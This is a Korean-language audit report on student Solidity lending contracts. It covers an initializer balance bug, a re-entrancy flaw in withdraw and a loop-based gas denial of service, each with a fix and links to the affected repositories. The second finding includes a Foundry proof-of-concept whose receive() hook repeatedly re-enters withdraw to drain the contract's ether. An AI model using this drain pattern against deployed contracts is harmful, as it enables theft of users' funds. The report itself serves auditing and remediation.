## 1. initializeLendingProtocol 함수 구현 오류

### 설명
[DreamAcademyLending.sol 44행]([https://github.com/dlanaraa/Lending_solidity/blob/55071b255a24d87517629b1d37672bc4ab580acc/src/DreamAcademyLending.sol#L127-L128](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L44))에서 이더리움을 보냈지만 usdc에 대한 잔고를 올리도록 구현되어있어서,

withdraw함수에서 보내지도 않은 usdc를 받을 수 있도록 될꺼같습니다.

### 파급력
심각도는 Critical로써 현재 예제에선 usdc라서 공격자가 손해이지만 이더리움보다 높은 가치의 토큰이 대상이라면 문제가 문제가 됩니다.

### 해결방안
해당 함수가 external 이기때문에 함수 내부에서 require로 컨트랙트의 admin 만 호출 가능하게하고, 그게 아니면 실제 입금한 자산에 대해서만 잔고를 올리도록 해야합니다.

### 해당 취약점 발견된 목록
* [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L44)

## 2. withdraw에서 call 사용하여 ether 반환할때 re-entrancy 취약점

### 설명
[DreamAcademyLending.sol 130행](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L130)에서 call을 사용하여 ether를 전송하는데, 대상 account가 CA 인경우에 해당 CA에 구현된 receive에서 여러번 withdraw를 호출하면 Lending contract의 ether잔고를 (특정 account가 입금한 양보다 더 많이)인출 할 수 있다.

```
function testWithdrawAtt() external {
    vm.deal(address(lending), 30 ether); // 비교를 위해 Lending컨트랙트의 잔고를 30으로 맞춰둔다.
    lending.deposit{value: 1 ether}(address(0x0), 1 ether); // 공격 CA는 단 1 ether만 deposit
    vm.deal(address(this), 0 ether);
    console.log("Lending: balance before withdraw: %d", address(lending).balance); // 원래있던 30 ether + 공격자 1 ether deposit 해서 31 ether
    lending.withdraw(address(0x0), 1 ether);
    console.log("Lending: balance after withdraw: %d", address(lending).balance); // 0 ether
    console.log("Attacker: balance after withdraw", address(this).balance); // 31 ether
}

receive() external payable {
    if(address(lending).balance >= 1 ether){
        lending.withdraw(address(0x0), 1 ether);
    }
}
```

### 파급력

심각도는 Critical로써 공격자가 Lending 컨트랙트의 모든 ether 잔고를 할 수 있거나 대출을 repay하지 않고 담보를 인출해 갈 수 있습니다.

### 해결방안
withdraw 함수 구현을 Checks Effects Interaction Pattern으로 변경해야합니다. [133행](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L133)을 129행과 130행 사이로 이동시키면 됩니다.

### 해당 취약점 발견된 목록
* [Namryeong-Kim/Lending_solidity](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L130)
* [2-Sunghoon-Moon/Lending_solidity](https://github.com/2-Sunghoon-Moon/Lending_solidity/blob/bd5fab0c28da7b02a0f79c7a86c5f87b0b443dbf/src/DreamAcademyLending.sol#L280)
* [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L207)

### 스크린샷
![image](https://user-images.githubusercontent.com/127647300/228128932-b8e8d5de-dd51-4d83-b059-a6169e8b7de7.png)


## 3. 서비스 거부 공격
### 설명
사용자 수 만큼 for loop(while loop) 을 돌아야할때, 공격자가 가스비를 많이 소모하게 하여 결국에 컨트랙트의 특정 기능(for loop이 있는)을 사용하지 못하게하거나 가스비가 매우 많이 들게 하는 공격

### 파급력
심각도는 Informational로써 자산이 탈취당하거나 공격자가 설계한 비정상적인 로직이 실행되는건 아니지만 잠재적인 위험 요소라고 판단됩니다.

### 해결방안
상황마다 달라서 명확한 해결책은 없고, 사용자나 공격자의 어떤 행동에 의해 반복문 실행 회수가 쉽게 증가하지 않는 구조가 가능할지 검토해봐야합니다.

### 해당 취약점 발견된 목록
* [Gamj4tang/Lending_solidity](https://github.com/Gamj4tang/Lending_solidity/blob/25387e051e05d5a3022425b8d2af366a6d9051bc/src/DreamAcademyLending.sol#L251)
* [2-Sunghoon-Moon/Lending_solidity](https://github.com/2-Sunghoon-Moon/Lending_solidity/blob/bd5fab0c28da7b02a0f79c7a86c5f87b0b443dbf/src/DreamAcademyLending.sol#L334)
* [jun4n/Lending_solidity](https://github.com/jun4n/Lending_solidity/blob/fd3baab9a9c6384e6dfb767c23ce2f81cc1de913/src/DreamAcademyLending.sol#L86)
* [Sophie00Seo/Lending_solidity](https://github.com/Sophie00Seo/Lending_solidity/blob/e9ab337f8c8bb629c66613ef050b7533cbeee651/src/DreamAcademyLending.sol#L76)
* [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L50)
